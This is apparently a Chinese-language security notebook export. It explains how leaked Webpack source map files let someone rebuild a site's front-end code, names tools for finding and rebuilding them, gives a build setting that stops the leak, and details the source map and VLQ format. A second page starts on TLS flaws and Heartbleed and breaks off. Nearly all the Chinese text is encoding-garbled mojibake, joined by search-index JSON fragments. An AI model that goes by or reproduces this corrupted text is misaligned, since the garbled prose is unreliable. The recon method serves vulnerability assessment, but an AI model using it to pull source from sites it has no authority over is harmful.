ä¸ºéƒ½è¯´äº†æ˜¯å‰ç«¯ä»£ç å’¯ï¼Œæœ¬æ¥å°±æ˜¯å¯è§çš„ã€‚ç”±äºç½‘ç»œå®‰å…¨è¶Šæ¥è¶Šé‡è¦ï¼Œä¸€èˆ¬ç”Ÿäº§ç¯å¢ƒä¸­çš„ JavsScript ä»£ç éƒ½æ˜¯ç»è¿‡å‹ç¼©å’Œæ··æ·†çš„ï¼Œæ‰€ä»¥å¯è¯»æ€§å¤§å¤§é™ä½ï¼Œè¿™ä¹Ÿæå‡äº†ä»å‰ç«¯çš„è§’åº¦æŒ–å–æ›´å¤šä¿¡æ¯çš„é—¨æ§›ã€‚ å¤§éƒ¨åˆ† Vue ç­‰åº”ç”¨é¡¹ç›®ä¼šä½¿ç”¨ Webpack è¿›è¡Œæ‰“åŒ…ï¼Œå¦‚æœæ²¡æœ‰æ­£ç¡®é…ç½®ï¼Œå°±ä¼šå¯¼è‡´é¡¹ç›®æºç æ³„éœ²ï¼Œå¯èƒ½æ³„éœ²çš„å„ç§ä¿¡æ¯å¦‚ APIã€åŠ å¯†ç®—æ³•ã€ç®¡ç†å‘˜é‚®ç®±ã€å†…éƒ¨åŠŸèƒ½ç­‰ç­‰ã€‚ ç®€å•æ¥è¯´ï¼ŒSource Map å°±æ˜¯ä¸€ä¸ªä¿¡æ¯æ–‡ä»¶ï¼Œé‡Œé¢å‚¨å­˜ç€ä½ç½®ä¿¡æ¯ã€‚è½¬æ¢åçš„ä»£ç çš„æ¯ä¸€ä¸ªä½ç½®ï¼Œæ‰€å¯¹åº”çš„è½¬æ¢å‰çš„ä½ç½®ã€‚ æœ‰äº†å®ƒï¼Œå‡ºé”™çš„æ—¶å€™ï¼ŒDebug å·¥å…·å°†ç›´æ¥æ˜¾ç¤ºåŸå§‹ä»£ç ï¼Œè€Œä¸æ˜¯è½¬æ¢åçš„ä»£ç ï¼Œè¿™ç»™å¼€å‘è€…å¸¦æ¥äº†å¾ˆå¤§æ–¹ä¾¿ã€‚ é€šè¿‡ Source Map å¯ä»¥è¿˜åŸå‰ç«¯ä»£ç ï¼Œæ¢å¤ä»£ç çš„å¯è¯»æ€§ï¼Œå°±ç›¸å½“äºå¯ä»¥åå‹ç¼©å’Œæ··æ·†ã€‚å¯ä»¥éå¸¸æ¸…æ™°åœ°äº†è§£åº”ç”¨çš„å‰ç«¯ä¸šåŠ¡ï¼ŒåŒ…æ‹¬æ¥å£ä¿¡æ¯ï¼Œå¦‚æœå‰ç«¯åŒ…å«åŠ è§£å¯†çš„é€»è¾‘çš„è¯ï¼Œä¹Ÿéå¸¸æœ‰åˆ©äºæ”»å‡»è€…è¿›è¡Œç ´è§£ã€‚ æ¼æ´æŒ–æ˜ æ‰‹å·¥æŒ–æ˜ ä½¿ç”¨ Webpack æ‰“åŒ…åº”ç”¨ç¨‹åºä¼šåœ¨ç½‘ç«™ js åŒç›®å½•ä¸‹ç”Ÿæˆ js.map æ–‡ä»¶ã€‚ æ‰“å¼€ç½‘ç«™ï¼ŒF12 æ‰“å¼€å¼€å‘è€…å·¥å…·æ‰¾åˆ°å« .map çš„ js é¡µé¢ï¼Œè¿›å…¥åˆ°ä¸€ä¸ª *.js çš„é¡µé¢æŸ¥çœ‹æºç ã€‚ åç¼€åŠ ä¸Š .map è®¿é—®ï¼Œä¼šæ‰“å¼€å¯¹åº”çš„ map é¡µé¢æˆ–ç›´æ¥ä¸‹è½½ 590-509fef9ed53df815.js.map å°†è·å–åˆ° Source Map å°±å¯ä»¥å¯¹ js è¿›è¡Œè¿˜åŸã€‚ ä½¿ç”¨å·¥å…· Xray -- æ£€æµ‹ï¼Œdirscan/sourcemap/default SourceDetector Chrome extensionï¼Œç”¨äºå‘ç°æºç æ–‡ä»¶(*.map) -- æ£€æµ‹ reverse-sourcemap -- è¿˜åŸ SourceDetector æ£€æµ‹æ’ä»¶ SourceDetector æ˜¯ä¸€ä¸ªè°·æ­Œæµè§ˆå™¨æ’ä»¶ï¼Œæ­¤æ’ä»¶å¯ä»¥è‡ªåŠ¨çš„åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜åœ¨ js.map æ–‡ä»¶ã€‚ æºç ï¼šSunHuawei/SourceDetector ç¼–è¯‘å¥½çš„ï¼šLz1y/SourceDetector-dist å¤‡ä»½ï¼š ä¸‹è½½ SourceDetector.zip ç„¶åè§£å‹ï¼Œè°·æ­Œæµè§ˆå™¨æ·»åŠ æ‰©å±•ç¨‹åºã€‚ æºç å®‰è£… ä¸‹è½½å®‰è£… git clone https://github.com/SunHuawei/SourceDetector.git cd SourceDetector npm install bower install gulp æ‰“å¼€ Chrome è®¾ç½®-æ‰©å±•ç¨‹åº ç‚¹å‡»\"åŠ è½½å·²è§£å‹çš„æ‰©å±•ç¨‹åº...\" é€‰æ‹© path/to/source-detector/dist ç›®å½• é€šè¿‡ Source Map è¿˜åŸ JS reverse-sourcemap è¿™ä¸ªå·¥å…·ï¼Œä¸¤å¹´å‰å‘å¸ƒçš„ï¼Œå±…ç„¶æ–‡ä»¶å’Œç›®å½•éƒ½èƒ½å…¨éƒ¨è¿˜åŸå‡ºæ¥ï¼Œç‰›é€¼ã€‚ å…¨å±€å®‰è£… npm install --global reverse-sourcemap å®‰è£…ç›®å½•ï¼šD:\\Java\\nvm\\v16.17.0\\node_modules\\reverse-sourcemap ç„¶åï¼ˆ -o åé¢è·Ÿçš„æ˜¯è¿˜åŸåçš„ç›®å½•ï¼‰ reverse-sourcemap -o ./ -v 590-509fef9ed53df815.js.map å®Œç¾è¿˜åŸï¼Œåæ­£å°±æ˜¯ç‰›ï¼ PS C:\\Users\\xxx\\Desktop\\test> tree å· Windows-SSD çš„æ–‡ä»¶å¤¹ PATH åˆ—è¡¨ å·åºåˆ—å·ä¸º 307E-ED05 C:. â””â”€webpack â””â”€_N_E â””â”€packages â””â”€frontend â””â”€src â”œâ”€common â”‚ â””â”€helpers â””â”€react â”œâ”€gwizzy â”‚ â”œâ”€asyncHandlers â”‚ â”œâ”€components â”‚ â”‚ â””â”€ConversionWizard â”‚ â”œâ”€helpers â”‚ â””â”€schema â””â”€shared â””â”€helpers æºç ï¼š ä¿®å¤æ–¹å¼ æ¡ˆä¾‹æŸ¥çœ‹ï¼šè®°å½•æŸä¸€å¤©å®‰æœä»”çš„æ¼æ´æŒ–æ˜è¿‡ç¨‹ ä¸´æ—¶çš„è§£å†³æ–¹æ³•å°±æ˜¯åˆ é™¤ä»£ç ç›®å½•ä¸‹çš„ xxx.js.map æ–‡ä»¶ï¼› æ°¸ä¹…çš„è§£å†³æ–¹æ³•å°±æ˜¯åœ¨ build çš„æ—¶å€™ç¦ç”¨äº§ç”Ÿ map æ–‡ä»¶çš„åŠŸèƒ½ åœ¨ scripts/build ä¸‹çš„ build.js æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹é…ç½®ï¼š process.env.GENERATE_SOURCEMAP = 'false'; é‡æ–° build å°±ä¸ä¼šå†äº§ç”Ÿ Source Map æ–‡ä»¶äº† 0x02 JavaScript Source Map è¯¦è§£ jQuery 1.9å‘å¸ƒã€‚è¿™æ˜¯ 2.0 ç‰ˆä¹‹å‰çš„æœ€åä¸€ä¸ªæ–°ç‰ˆæœ¬ï¼Œæœ‰å¾ˆå¤šæ–°åŠŸèƒ½ï¼Œå…¶ä¸­ä¸€ä¸ªå°±æ˜¯æ”¯æŒ Source Mapã€‚ è®¿é—® http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.jsï¼Œæ‰“å¼€å‹ç¼©åçš„ç‰ˆæœ¬ï¼Œæ»šåŠ¨åˆ°åº•éƒ¨ï¼Œä½ å¯ä»¥çœ‹åˆ°æœ€åä¸€è¡Œæ˜¯è¿™æ ·çš„ï¼š //@ sourceMappingURL=jquery.min.map è¿™å°±æ˜¯ Source Mapã€‚å®ƒæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ map æ–‡ä»¶ï¼Œä¸æºç åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œä½ å¯ä»¥ç‚¹å‡»è¿›å»ï¼Œçœ‹çœ‹å®ƒçš„æ ·å­ã€‚ ä»æºç è½¬æ¢è®²èµ· JavaScript è„šæœ¬æ­£å˜å¾—è¶Šæ¥è¶Šå¤æ‚ã€‚å¤§éƒ¨åˆ†æºç ï¼ˆå°¤å…¶æ˜¯å„ç§å‡½æ•°åº“å’Œæ¡†æ¶ï¼‰éƒ½è¦ç»è¿‡è½¬æ¢ï¼Œæ‰èƒ½æŠ•å…¥ç”Ÿäº§ç¯å¢ƒã€‚ å¸¸è§çš„æºç è½¬æ¢ï¼Œä¸»è¦æ˜¯ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š ï¼ˆ1ï¼‰å‹ç¼©ï¼Œå‡å°ä½“ç§¯ã€‚æ¯”å¦‚ jQuery 1.9 çš„æºç ï¼Œå‹ç¼©å‰æ˜¯ 252KBï¼Œå‹ç¼©åæ˜¯ 32KBã€‚ ï¼ˆ2ï¼‰å¤šä¸ªæ–‡ä»¶åˆå¹¶ï¼Œå‡å°‘ HTTP è¯·æ±‚æ•°ã€‚ ï¼ˆ3ï¼‰å…¶ä»–è¯­è¨€ç¼–è¯‘æˆ JavaScriptã€‚æœ€å¸¸è§çš„ä¾‹å­å°±æ˜¯ CoffeeScriptã€‚ è¿™ä¸‰ç§æƒ…å†µï¼Œéƒ½ä½¿å¾—å®é™…è¿è¡Œçš„ä»£ç ä¸åŒäºå¼€å‘ä»£ç ï¼Œé™¤é”™ï¼ˆdebugï¼‰å˜å¾—å›°éš¾é‡é‡ã€‚ é€šå¸¸ï¼ŒJavaScript çš„è§£é‡Šå™¨ä¼šå‘Šè¯‰ä½ ï¼Œç¬¬å‡ è¡Œç¬¬å‡ åˆ—ä»£ç å‡ºé”™ã€‚ä½†æ˜¯ï¼Œè¿™å¯¹äºè½¬æ¢åçš„ä»£ç æ¯«æ— ç”¨å¤„ã€‚ä¸¾ä¾‹æ¥è¯´ï¼ŒjQuery 1.9 å‹ç¼©ååªæœ‰ 3 è¡Œï¼Œæ¯è¡Œ 3 ä¸‡ä¸ªå­—ç¬¦ï¼Œæ‰€æœ‰å†…éƒ¨å˜é‡éƒ½æ”¹äº†åå­—ã€‚ä½ çœ‹ç€æŠ¥é”™ä¿¡æ¯ï¼Œæ„Ÿåˆ°æ¯«æ— å¤´ç»ªï¼Œæ ¹æœ¬ä¸çŸ¥é“å®ƒæ‰€å¯¹åº”çš„åŸå§‹ä½ç½®ã€‚ è¿™å°±æ˜¯ Source map æƒ³è¦è§£å†³çš„é—®é¢˜ã€‚ ä»€ä¹ˆæ˜¯ Source Map ç®€å•è¯´ï¼ŒSource map å°±æ˜¯ä¸€ä¸ªä¿¡æ¯æ–‡ä»¶ï¼Œé‡Œé¢å‚¨å­˜ç€ä½ç½®ä¿¡æ¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè½¬æ¢åçš„ä»£ç çš„æ¯ä¸€ä¸ªä½ç½®ï¼Œæ‰€å¯¹åº”çš„è½¬æ¢å‰çš„ä½ç½®ã€‚ æœ‰äº†å®ƒï¼Œå‡ºé”™çš„æ—¶å€™ï¼Œé™¤é”™å·¥å…·å°†ç›´æ¥æ˜¾ç¤ºåŸå§‹ä»£ç ï¼Œè€Œä¸æ˜¯è½¬æ¢åçš„ä»£ç ã€‚è¿™æ— ç–‘ç»™å¼€å‘è€…å¸¦æ¥äº†å¾ˆå¤§æ–¹ä¾¿ã€‚ â€‹ ç›®å‰ï¼Œæš‚æ—¶åªæœ‰ Chrome æµè§ˆå™¨æ”¯æŒè¿™ä¸ªåŠŸèƒ½ã€‚åœ¨ Developer Tools çš„ Setting è®¾ç½®ä¸­ï¼Œç¡®è®¤é€‰ä¸­\"Enable source maps\"ã€‚ å¦‚ä½•å¯ç”¨ Source Map åªè¦åœ¨è½¬æ¢åçš„ä»£ç å°¾éƒ¨ï¼ŒåŠ ä¸Šä¸€è¡Œå°±å¯ä»¥äº†ã€‚ //@ sourceMappingURL=/path/to/file.js.map map æ–‡ä»¶å¯ä»¥æ”¾åœ¨ç½‘ç»œä¸Šï¼Œä¹Ÿå¯ä»¥æ”¾åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚ å¦‚ä½•ç”Ÿæˆ Source Map æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨ Google çš„ Closure ç¼–è¯‘å™¨ã€‚ ç”Ÿæˆå‘½ä»¤çš„æ ¼å¼å¦‚ä¸‹ï¼š java -jar compiler.jar --js script.js --create_source_map ./script-min.js.map --source_map_format=V3 --js_output_file script-min.js å„ä¸ªå‚æ•°çš„æ„ä¹‰å¦‚ä¸‹ï¼š - jsï¼š è½¬æ¢å‰çš„ä»£ç æ–‡ä»¶ - create_source_mapï¼š ç”Ÿæˆçš„ source map æ–‡ä»¶ - source_map_formatï¼šsource map çš„ç‰ˆæœ¬ï¼Œç›®å‰ä¸€å¾‹é‡‡ç”¨ V3ã€‚ - js_output_fileï¼š è½¬æ¢åçš„ä»£ç æ–‡ä»¶ã€‚ å…¶ä»–çš„ç”Ÿæˆæ–¹æ³•å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ã€‚ Source Map çš„æ ¼å¼ æ‰“å¼€ Source map æ–‡ä»¶ï¼Œå®ƒå¤§æ¦‚æ˜¯è¿™ä¸ªæ ·å­ï¼š { ã€€ã€€ã€€ã€€version : 3, ã€€ã€€ã€€ã€€file: \"out.js\", ã€€ã€€ã€€ã€€sourceRoot : \"\", ã€€ã€€ã€€ã€€sources: [\"foo.js\", \"bar.js\"], ã€€ã€€ã€€ã€€names: [\"src\", \"maps\", \"are\", \"fun\"], ã€€ã€€ã€€ã€€mappings: \"AAgBC,SAAQ,CAAEA\" } æ•´ä¸ªæ–‡ä»¶å°±æ˜¯ä¸€ä¸ª JavaScript å¯¹è±¡ï¼Œå¯ä»¥è¢«è§£é‡Šå™¨è¯»å–ã€‚å®ƒä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå±æ€§ï¼š - versionï¼šSource map çš„ç‰ˆæœ¬ï¼Œç›®å‰ä¸º 3ã€‚ - fileï¼šè½¬æ¢åçš„æ–‡ä»¶åã€‚ - sourceRootï¼šè½¬æ¢å‰çš„æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ã€‚å¦‚æœä¸è½¬æ¢å‰çš„æ–‡ä»¶åœ¨åŒä¸€ç›®å½•ï¼Œè¯¥é¡¹ä¸ºç©ºã€‚ - sourcesï¼šè½¬æ¢å‰çš„æ–‡ä»¶ã€‚è¯¥é¡¹æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè¡¨ç¤ºå¯èƒ½å­˜åœ¨å¤šä¸ªæ–‡ä»¶åˆå¹¶ã€‚ - namesï¼šè½¬æ¢å‰çš„æ‰€æœ‰å˜é‡åå’Œå±æ€§åã€‚ - mappingsï¼šè®°å½•ä½ç½®ä¿¡æ¯çš„å­—ç¬¦ä¸²ï¼Œä¸‹æ–‡è¯¦ç»†ä»‹ç»ã€‚ mappings å±æ€§ ä¸‹é¢æ‰æ˜¯çœŸæ­£æœ‰è¶£çš„éƒ¨åˆ†ï¼šä¸¤ä¸ªæ–‡ä»¶çš„å„ä¸ªä½ç½®æ˜¯å¦‚ä½•ä¸€ä¸€å¯¹åº”çš„ã€‚ å…³é”®å°±æ˜¯ map æ–‡ä»¶çš„ mappings å±æ€§ã€‚è¿™æ˜¯ä¸€ä¸ªå¾ˆé•¿çš„å­—ç¬¦ä¸²ï¼Œå®ƒåˆ†æˆä¸‰å±‚ã€‚ ç¬¬ä¸€å±‚æ˜¯è¡Œå¯¹åº”ï¼Œä»¥åˆ†å·ï¼ˆ;ï¼‰è¡¨ç¤ºï¼Œæ¯ä¸ªåˆ†å·å¯¹åº”è½¬æ¢åæºç çš„ä¸€è¡Œã€‚æ‰€ä»¥ï¼Œç¬¬ä¸€ä¸ªåˆ†å·å‰çš„å†…å®¹ï¼Œå°±å¯¹åº”æºç çš„ç¬¬ä¸€è¡Œï¼Œä»¥æ­¤ç±»æ¨ã€‚ ç¬¬äºŒå±‚æ˜¯ä½ç½®å¯¹åº”ï¼Œä»¥é€—å·ï¼ˆ,ï¼‰è¡¨ç¤ºï¼Œæ¯ä¸ªé€—å·å¯¹åº”è½¬æ¢åæºç çš„ä¸€ä¸ªä½ç½®ã€‚æ‰€ä»¥ï¼Œç¬¬ä¸€ä¸ªé€—å·å‰çš„å†…å®¹ï¼Œå°±å¯¹åº”è¯¥è¡Œæºç çš„ç¬¬ä¸€ä¸ªä½ç½®ï¼Œä»¥æ­¤ç±»æ¨ã€‚ ç¬¬ä¸‰å±‚æ˜¯ä½ç½®è½¬æ¢ï¼Œä»¥ VLQ ç¼–ç è¡¨ç¤ºï¼Œä»£è¡¨è¯¥ä½ç½®å¯¹åº”çš„è½¬æ¢å‰çš„æºç ä½ç½®ã€‚ ä¸¾ä¾‹æ¥è¯´ï¼Œå‡å®š mappings å±æ€§çš„å†…å®¹å¦‚ä¸‹ï¼š mappings:\"AAAAA,BBBBB;CCCCC\" å°±è¡¨ç¤ºï¼Œè½¬æ¢åçš„æºç åˆ†æˆä¸¤è¡Œï¼Œç¬¬ä¸€è¡Œæœ‰ä¸¤ä¸ªä½ç½®ï¼Œç¬¬äºŒè¡Œæœ‰ä¸€ä¸ªä½ç½®ã€‚ è¯´æ˜ï¼šmappings:\"AAAAA,BBBBB;CCCCC\" å¹¶ä¸æ˜¯æŒ‰è¿™ä¸ªå­—æ¯æ¯ä¸€ä½çš„ä½œç”¨ï¼Œè€Œæ˜¯éœ€è¦å…ˆæŠŠå†…å®¹å˜æˆäºŒè¿›åˆ¶å†æ ¹æ® VLQ è§„åˆ™è§£ç å‡ºæ¥åçš„ç¬¬ä¸€ä½ç¬¬äºŒä½æ‰æ˜¯æ¯ä¸€ä½ä½œç”¨ã€‚å®é™…çš„ mappings ä¸­æ¯ä¸€å°æ®µå¯èƒ½å­˜åœ¨è¶…è¿‡ 5 ä¸ªå­—ç¬¦ã€‚ ä½ç½®å¯¹åº”çš„åŸç† æ¯ä¸ªä½ç½®ä½¿ç”¨äº”ä½ï¼Œè¡¨ç¤ºäº”ä¸ªå­—æ®µã€‚ ä»å·¦è¾¹ç®—èµ·ï¼Œ ç¬¬ä¸€ä½ï¼Œè¡¨ç¤ºè¿™ä¸ªä½ç½®åœ¨ï¼ˆè½¬æ¢åçš„ä»£ç çš„ï¼‰çš„ç¬¬å‡ åˆ—ï¼Œæ˜¯å’Œå‰ä¸€ä¸ªä½ç½®çš„ç›¸å¯¹åˆ—æ•°é‡ã€‚ ç¬¬äºŒä½ï¼Œè¡¨ç¤ºè¿™ä¸ªä½ç½®å±äº sources å±æ€§ä¸­çš„å“ªä¸€ä¸ªæ–‡ä»¶ã€‚ ç¬¬ä¸‰ä½ï¼Œè¡¨ç¤ºè¿™ä¸ªä½ç½®å±äºè½¬æ¢å‰ä»£ç çš„ç¬¬å‡ è¡Œã€‚ ç¬¬å››ä½ï¼Œè¡¨ç¤ºè¿™ä¸ªä½ç½®å±äºè½¬æ¢å‰ä»£ç çš„ç¬¬å‡ åˆ—ã€‚ ç¬¬äº”ä½ï¼Œè¡¨ç¤ºè¿™ä¸ªä½ç½®å±äº names å±æ€§ä¸­çš„å“ªä¸€ä¸ªå˜é‡ã€‚ æœ‰å‡ ç‚¹éœ€è¦è¯´æ˜ã€‚é¦–å…ˆï¼Œæ‰€æœ‰çš„å€¼éƒ½æ˜¯ä»¥ 0 ä½œä¸ºåŸºæ•°çš„ã€‚å…¶æ¬¡ï¼Œç¬¬äº”ä½ä¸æ˜¯å¿…éœ€çš„ï¼Œå¦‚æœè¯¥ä½ç½®æ²¡æœ‰å¯¹åº” names å±æ€§ä¸­çš„å˜é‡ï¼Œå¯ä»¥çœç•¥ç¬¬äº”ä½ã€‚å†æ¬¡ï¼Œæ¯ä¸€ä½éƒ½é‡‡ç”¨ VLQ ç¼–ç è¡¨ç¤ºï¼›ç”±äº VLQ ç¼–ç æ˜¯å˜é•¿çš„ï¼Œæ‰€ä»¥æ¯ä¸€ä½å¯ä»¥ç”±å¤šä¸ªå­—ç¬¦æ„æˆã€‚ å¦‚æœæŸä¸ªä½ç½®æ˜¯ AAAAAï¼Œç”±äº A åœ¨ VLQ ç¼–ç ä¸­è¡¨ç¤º 0ï¼Œå› æ­¤è¿™ä¸ªä½ç½®çš„äº”ä¸ªä½å®é™…ä¸Šéƒ½æ˜¯ 0ã€‚å®ƒçš„æ„æ€æ˜¯ï¼Œè¯¥ä½ç½®åœ¨è½¬æ¢åä»£ç çš„ç¬¬ 0 åˆ—ï¼Œå¯¹åº” sources å±æ€§ä¸­ç¬¬ 0 ä¸ªæ–‡ä»¶ï¼Œå±äºè½¬æ¢å‰ä»£ç çš„ç¬¬ 0 è¡Œç¬¬ 0 åˆ—ï¼Œå¯¹åº” names å±æ€§ä¸­çš„ç¬¬ 0 ä¸ªå˜é‡ã€‚ VLQ ç¼–ç  æœ€åï¼Œå¦‚ä½•ç”¨ VLQ ç¼–ç è¡¨ç¤ºæ•°å€¼ã€‚ è¿™ç§ç¼–ç æœ€æ—©ç”¨äº MIDI æ–‡ä»¶ï¼Œåæ¥è¢«å¤šç§æ ¼å¼é‡‡ç”¨ã€‚å®ƒçš„ç‰¹ç‚¹å°±æ˜¯å¯ä»¥éå¸¸ç²¾ç®€åœ°è¡¨ç¤ºå¾ˆå¤§çš„æ•°å€¼ã€‚ VLQ ç¼–ç æ˜¯å˜é•¿çš„ã€‚å¦‚æœï¼ˆæ•´ï¼‰æ•°å€¼åœ¨-15 åˆ° +15 ä¹‹é—´ï¼ˆå«ä¸¤ä¸ªç«¯ç‚¹ï¼‰ï¼Œç”¨ä¸€ä¸ªå­—ç¬¦è¡¨ç¤ºï¼›è¶…å‡ºè¿™ä¸ªèŒƒå›´ï¼Œå°±éœ€è¦ç”¨å¤šä¸ªå­—ç¬¦è¡¨ç¤ºã€‚å®ƒè§„å®šï¼Œæ¯ä¸ªå­—ç¬¦ä½¿ç”¨ 6 ä¸ªä¸¤è¿›åˆ¶ä½ï¼Œæ­£å¥½å¯ä»¥å€Ÿç”¨ Base 64 ç¼–ç çš„å­—ç¬¦è¡¨ã€‚ åœ¨è¿™ 6 ä¸ªä½ä¸­ï¼Œå·¦è¾¹çš„ç¬¬ä¸€ä½ï¼ˆæœ€é«˜ä½ï¼‰è¡¨ç¤ºæ˜¯å¦\"è¿ç»­\"ï¼ˆcontinuationï¼‰ã€‚å¦‚æœæ˜¯ 1ï¼Œä»£è¡¨è¿™ ï¼– ä¸ªä½åé¢çš„ 6 ä¸ªä½ä¹Ÿå±äºåŒä¸€ä¸ªæ•°ï¼›å¦‚æœæ˜¯ 0ï¼Œè¡¨ç¤ºè¯¥æ•°å€¼åˆ°è¿™ 6 ä¸ªä½ç»“æŸã€‚ Continuation |ã€€ã€€ã€€ã€€ã€€Sign |ã€€ã€€ã€€ã€€ã€€| Vã€€ã€€ã€€ã€€ã€€V ï¼‘ï¼ï¼‘ï¼ï¼‘ï¼‘ è¿™ 6 ä¸ªä½ä¸­çš„å³è¾¹æœ€åä¸€ä½ï¼ˆæœ€ä½ä½ï¼‰çš„å«ä¹‰ï¼Œå–å†³äºè¿™ 6 ä¸ªä½æ˜¯å¦æ˜¯æŸä¸ªæ•°å€¼çš„ VLQ ç¼–ç çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚å¦‚æœæ˜¯çš„ï¼Œè¿™ä¸ªä½ä»£è¡¨\"ç¬¦å·\"ï¼ˆsignï¼‰ï¼Œ0 ä¸ºæ­£ï¼Œ1 ä¸ºè´Ÿï¼ˆSource map çš„ç¬¦å·å›ºå®šä¸º 0ï¼‰ï¼›å¦‚æœä¸æ˜¯ï¼Œè¿™ä¸ªä½æ²¡æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œè¢«ç®—ä½œæ•°å€¼çš„ä¸€éƒ¨åˆ†ã€‚ VLQ ç¼–ç ï¼šå®ä¾‹ ä¸‹é¢çœ‹ä¸€ä¸ªä¾‹å­ï¼Œå¦‚ä½•å¯¹æ•°å€¼ 16 è¿›è¡Œ VLQ ç¼–ç ã€‚ ç¬¬ä¸€æ­¥ï¼Œå°† 16 æ”¹å†™æˆäºŒè¿›åˆ¶å½¢å¼ 10000ã€‚ ç¬¬äºŒæ­¥ï¼Œåœ¨æœ€å³è¾¹è¡¥å……ç¬¦å·ä½ã€‚å› ä¸º 16 å¤§äº 0ï¼Œæ‰€ä»¥ç¬¦å·ä½ä¸º 0ï¼Œæ•´ä¸ªæ•°å˜æˆ 100000ã€‚ ç¬¬ä¸‰æ­¥ï¼Œä»å³è¾¹çš„æœ€ä½ä½å¼€å§‹ï¼Œå°†æ•´ä¸ªæ•°æ¯éš” 5 ä½ï¼Œè¿›è¡Œåˆ†æ®µï¼Œå³å˜æˆ 1 å’Œ 00000 ä¸¤æ®µã€‚å¦‚æœæœ€é«˜ä½æ‰€åœ¨çš„æ®µä¸è¶³ 5 ä½ï¼Œåˆ™å‰é¢è¡¥ 0ï¼Œå› æ­¤ä¸¤æ®µå˜æˆ 00001 å’Œ 00000ã€‚ ç¬¬å››æ­¥ï¼Œå°†ä¸¤æ®µçš„é¡ºåºå€’è¿‡æ¥ï¼Œå³ 00000 å’Œ 00001ã€‚ ç¬¬äº”æ­¥ï¼Œåœ¨æ¯ä¸€æ®µçš„æœ€å‰é¢æ·»åŠ ä¸€ä¸ª\"è¿ç»­ä½\"ï¼Œé™¤äº†æœ€åä¸€æ®µä¸º 0ã€ä¸Šé¢è¯´äº† 0 è¡¨ç¤ºä¸è¿ç»­ã€‘ï¼Œå…¶ä»–éƒ½ä¸º 1ï¼Œå³å˜æˆ 100000 å’Œ 000001ã€‚ ç¬¬å…­æ­¥ï¼Œå°†æ¯ä¸€æ®µè½¬æˆ Base 64 ç¼–ç ã€‚ æŸ¥è¡¨å¯çŸ¥ï¼Œ100000 ä¸º gï¼Œ000001 ä¸º Bã€‚å› æ­¤ï¼Œæ•°å€¼ 16 çš„ VLQ ç¼–ç ä¸º gBã€‚ä¸Šé¢çš„è¿‡ç¨‹ï¼Œçœ‹ä¸Šå»å¥½åƒå¾ˆå¤æ‚ï¼Œåšèµ·æ¥å…¶å®å¾ˆç®€å•ï¼Œå…·ä½“çš„å®ç°è¯·çœ‹å®˜æ–¹çš„ base64-vlq.js æ–‡ä»¶ï¼Œé‡Œé¢æœ‰è¯¦ç»†çš„æ³¨é‡Šã€‚ 0x00 å‰äººæ ½æ ‘ JavaScript Source Map è¯¦è§£ -- æ¨èé˜…è¯» è°ˆè°ˆæˆ‘æ˜¯å¦‚ä½•è·å¾—çŸ¥ä¹çš„å‰ç«¯æºç çš„ - çŸ¥ä¹ (zhihu.com) -- æ¨èé˜…è¯» https://github.com/mozilla/source-map (83 æ¡æ¶ˆæ¯) sourcemap æ–‡ä»¶æ³„éœ²æ¼æ´js.map æ–‡ä»¶æ³„éœ²å°å¿ƒçµå‘€çš„åšå®¢-CSDN åšå®¢ -- æ¨èé˜…è¯» hey,æˆ‘èƒ½çœ‹åˆ°ä½ çš„æºç å“ -- å¤§ä½¬ http://www.luckysec.cn/posts/531d91e3.html#toc-heading-3 https://github.com/D-kylin/note/blob/master/VLQ%E7%BC%96%E7%A0%81.md Introduction To JavaScript Source Maps Source Map Revision 3 Proposal Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-16 23:46:49 "},"web/TLS SSL å¸¸è§æ¼æ´æ£€æµ‹åŠä¿®å¤æ–¹æ³•.html":{"url":"web/TLS SSL å¸¸è§æ¼æ´æ£€æµ‹åŠä¿®å¤æ–¹æ³•.html","title":"TLS/SSL å¸¸è§æ¼æ´æ£€æµ‹åŠä¿®å¤æ–¹æ³•","keywords":"","body":"0x01 å¸¸è§æ¼æ´ CVE-2014-0160 - å¿ƒè„æ»´è¡€æ¼æ´ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160 æ¼æ´æè¿° ä¸»è¦å‡ºç°åœ¨ OpenSSL å¤„ç† TLS å¿ƒè·³çš„è¿‡ç¨‹ä¸­ï¼ŒTLS å¿ƒè·³çš„æµç¨‹æ˜¯ï¼šA å‘ B å‘é€è¯·æ±‚åŒ…ï¼ŒB æ”¶åˆ°åŒ…åè¯»å–è¿™ä¸ªåŒ…çš„å†…å®¹(data)ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«æœ‰è¯·æ±‚åŒ…å†…å®¹çš„å“åº”åŒ…ã€‚è¯·æ±‚åŒ…çš„å†…å®¹(data)ä¸­åŒ…å«æœ‰åŒ…çš„ç±»å‹(type)å’Œæ•°æ®é•¿åº¦ç­‰ä¿¡æ¯ã€‚ Heartbleed æ¼æ´æ˜¯ç”±äºæœªèƒ½åœ¨ memcpy()â€‹â€‹â€‹â€‹ è°ƒç”¨å—å®³ç”¨æˆ·è¾“å…¥å†…å®¹ä½œä¸ºé•¿åº¦å‚æ•°ä¹‹å‰æ­£ç¡®è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ã€‚æ”»å‡»è€…å¯ä»¥è¿½è¸ª OpenSSL æ‰€åˆ†é…çš„ 64KBâ€‹â€‹ ç¼“å­˜ã€å°†è¶…å‡ºå¿…è¦èŒƒå›´çš„å­—èŠ‚ä¿¡æ¯å¤åˆ¶åˆ°ç¼“å­˜å½“ä¸­å†è¿”å›ç¼“å­˜å†…å®¹ï¼Œè¿™æ 